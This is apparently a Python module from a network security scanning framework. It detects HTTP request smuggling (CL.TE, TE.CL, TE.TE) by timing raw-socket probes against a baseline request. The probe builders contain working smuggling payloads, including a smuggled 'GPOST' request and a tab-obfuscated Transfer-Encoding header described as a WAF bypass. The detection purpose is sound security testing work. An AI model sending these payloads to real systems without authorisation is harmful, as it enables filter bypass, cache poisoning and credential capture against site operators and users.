"""HTTP Request Smuggling scanner — CL.TE / TE.CL / TE.TE timing differential.

Implements the canonical PortSwigger differential-timing approach:
- Send a probe that should be slow on a vulnerable front-end/back-end
  pair, fast on a non-vulnerable one. Compare to a baseline.
- Three flavours:
    CL.TE  — front-end uses Content-Length, back-end uses Transfer-Encoding
    TE.CL  — front-end uses Transfer-Encoding, back-end uses Content-Length
    TE.TE  — both speak TE but disagree on a malformed header

We use raw sockets (asyncio.open_connection) because httpx normalises
headers and refuses ambiguous CL/TE pairs by design.

Pure stdlib — asyncio + ssl. No new deps.
"""

from __future__ import annotations

import asyncio
import ssl
import time
from typing import TYPE_CHECKING
from urllib.parse import urlparse

from network_pipeline.scanners import Scanner, register_scanner
from network_pipeline.scanners._common import ScanFinding, ScanResult

if TYPE_CHECKING:
    from network_pipeline.tools.runtime import HTTPClient


# Probes mirror PortSwigger's labs. The "vulnerable" probe should hang
# until socket timeout on a smuggling-broken pair.
_BASE_TIMEOUT_S = 5.0
_PROBE_TIMEOUT_S = 12.0  # vulnerable pair should hang until close to this


def _cl_te_probe(host: str, path: str = "/") -> bytes:
    """Front-end uses CL=N+M (sees one request); back-end uses TE: chunked
    (sees a smuggled second request after the 0-chunk)."""
    body = b"0\r\n\r\nG"  # 0-chunk + leading 'G' of next-request smuggle
    cl = len(body)
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {cl}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("ascii") + body


def _te_cl_probe(host: str, path: str = "/") -> bytes:
    """Front-end uses TE; back-end uses CL=3 — 'SMUG' is smuggled."""
    body = (
        "5c\r\n"
        "GPOST / HTTP/1.1\r\n"
        "Host: " + host + "\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "x=1\r\n"
        "0\r\n"
        "\r\n"
    )
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("ascii") + body.encode("ascii")


def _te_te_probe(host: str, path: str = "/") -> bytes:
    """Both speak TE; obfuscate one header so they disagree on which to
    parse. Common WAF bypass: ``Transfer-Encoding: xchunked`` + the real
    one wrapped in a tab."""
    body = (
        "5c\r\n"
        "GPOST / HTTP/1.1\r\n"
        "Host: " + host + "\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
    )
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Transfer-encoding: \tchunked\r\n"  # tab confuses some parsers
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("ascii") + body.encode("ascii")


def _baseline_probe(host: str, path: str = "/") -> bytes:
    """A clean GET; should always be fast."""
    return (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("ascii")


@register_scanner
class RequestSmugglingScanner(Scanner):
    name = "request_smuggling"
    requires_libs = ()
    opsec_min = "loud"
    loud_level = "high"

    def __init__(self, http_client: "HTTPClient | None" = None) -> None:
        # http_client kept for API symmetry; this scanner uses raw sockets.
        self._http = http_client

    async def scan(self, target_url: str) -> ScanResult:
        result = ScanResult(scanner=self.name, target=target_url)
        try:
            host, port, scheme, path = _parse_target(target_url)
        except ValueError as e:
            result.success = False
            result.error = str(e)
            return result

        ssl_ctx = ssl.create_default_context() if scheme == "https" else None
        # Bug-fix: previous line did `ssl_ctx.check_hostname = ...` even
        # when ssl_ctx was None (HTTP target), raising AttributeError.
        if ssl_ctx is not None:
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE  # accept self-signed test sites

        # Baseline timing
        try:
            base_t = await _send_raw(host, port, ssl_ctx, _baseline_probe(host, path))
        except Exception as e:  # noqa: BLE001
            result.success = False
            result.error = f"baseline failed: {e!r}"
            return result
        result.data["baseline_ms"] = round(base_t * 1000, 1)

        # Three smuggling probes
        for label, builder in (
            ("CL.TE", _cl_te_probe),
            ("TE.CL", _te_cl_probe),
            ("TE.TE", _te_te_probe),
        ):
            try:
                t = await _send_raw(host, port, ssl_ctx, builder(host, path))
            except asyncio.TimeoutError:
                t = _PROBE_TIMEOUT_S
            except Exception as e:  # noqa: BLE001
                result.data.setdefault("errors", []).append(
                    f"{label}: {e!r}",
                )
                continue
            result.data[f"{label}_ms"] = round(t * 1000, 1)
            # Smuggling-vulnerable: probe took at least 3x baseline OR
            # hit the timeout cap.
            if t >= _PROBE_TIMEOUT_S - 0.5 or t >= max(2.0, base_t * 3):
                result.findings.append(ScanFinding(
                    vuln_class="http-request-smuggling",
                    title=f"HTTP request smuggling — {label} timing differential",
                    severity="high",
                    affected_target=target_url,
                    description=(
                        f"{label} probe completed in {t * 1000:.0f}ms vs. "
                        f"baseline {base_t * 1000:.0f}ms. The front-end and "
                        "back-end disagree on request boundaries — "
                        "adversaries chain this with cache poisoning, "
                        "credential capture, and authorisation bypass."
                    ),
                    cwe=["CWE-444"],
                    mitre=["T1499"],
                    confidence="probable",
                    extra={
                        "variant": label,
                        "probe_ms": round(t * 1000, 1),
                        "baseline_ms": round(base_t * 1000, 1),
                    },
                ))

        return result


# ── Raw-socket helpers ─────────────────────────────────────────────

def _parse_target(url: str) -> tuple[str, int, str, str]:
    """Parse to (host, port, scheme, path)."""
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError(f"unsupported scheme {parsed.scheme!r}")
    host = parsed.hostname or ""
    if not host:
        raise ValueError(f"no hostname in {url!r}")
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    return host, port, parsed.scheme, path


async def _send_raw(
    host: str,
    port: int,
    ssl_ctx: ssl.SSLContext | None,
    payload: bytes,
) -> float:
    """Send raw bytes and return wall-clock time until the connection
    closes or until ``_PROBE_TIMEOUT_S`` elapses."""
    t0 = time.monotonic()
    reader, writer = await asyncio.wait_for(
        asyncio.open_connection(
            host, port, ssl=ssl_ctx,
            server_hostname=host if ssl_ctx else None,
        ),
        timeout=_BASE_TIMEOUT_S,
    )
    try:
        writer.write(payload)
        await writer.drain()
        # Read until EOF or timeout
        try:
            await asyncio.wait_for(reader.read(8192), timeout=_PROBE_TIMEOUT_S)
        except asyncio.TimeoutError:
            return _PROBE_TIMEOUT_S
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:  # noqa: BLE001
            pass
    return time.monotonic() - t0
